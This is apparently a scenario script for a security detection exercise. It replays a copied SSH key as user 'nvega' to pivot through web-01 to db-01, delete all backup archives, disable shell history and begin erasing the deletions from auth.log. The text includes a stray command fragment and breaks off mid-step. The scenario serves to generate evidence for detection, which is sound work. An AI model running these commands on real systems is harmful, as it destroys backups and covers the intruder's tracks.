notes: The cleanup is the operations command with a second run for the newer files. The inner hosts are reached through web-01, as operations sometimes does. The evidence grows in steps: quiet (a look at the archives from a new address), strong (+560: the archive folder on db-01 is empty, and Nico himself is logged in on web-01 from his usual address at that time), then the second host (+760), the dump copies (+880), and a clean-up of auth.log on db-01 (+955) that leaves lines without their command.

steps.label: first login as Nico with the copied key; ordinary look
steps.run:
(sleep 3; printf '%s
' 'unset HISTFILE'; sleep 1; printf '%s
' 'sudo -n service nginx status > /dev/null'; sleep 40; printf '%s
' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no nvega@{target}

steps.label: quiet: through web-01 to db-01; list the archives and the dump copies
steps.run:
(sleep 3; printf '%s
' 'unset HISTFILE'; sleep 1; printf '%s
' 'sudo -n ls -lh /var/backups/larkspur > /dev/null'; sleep 6; printf '%s
' 'sudo -n ls -lh /var/backups > /dev/null'; sleep 100; printf '%s
' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand="ssh -i /root/.replay/kn -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}" nvega@10.20.0.20

steps.label: through web-01 to db-01 while Nico is at work; remove all archives
steps.run:
(sleep 3; printf '%s
' 'unset HISTFILE'; sleep 1; printf '%s
' 'sudo -n find /var/backups/larkspur -type f -mtime +7 -delete; sudo -n find /var/backups/larkspur -type f -mtime -8 -delete'; sleep 90; printf '%s
' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand="ssh -i /root/.replay/kn -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}" nvega@10.20.0.20

' 'unset HISTFILE'; sleep 1; printf '%s
' 'sudo -n find /srv/backups/larkspur -type f -mtime +7 -delete; sudo -n find /srv/backups/larkspur -type f -mtime -8 -delete'; sleep 80; printf '%s

steps.label: cover: take the removal commands out of auth.log on db-01
steps.run:
(sleep 3; printf '%s
' 'unset HISTFILE'; sleep 1; printf '%s
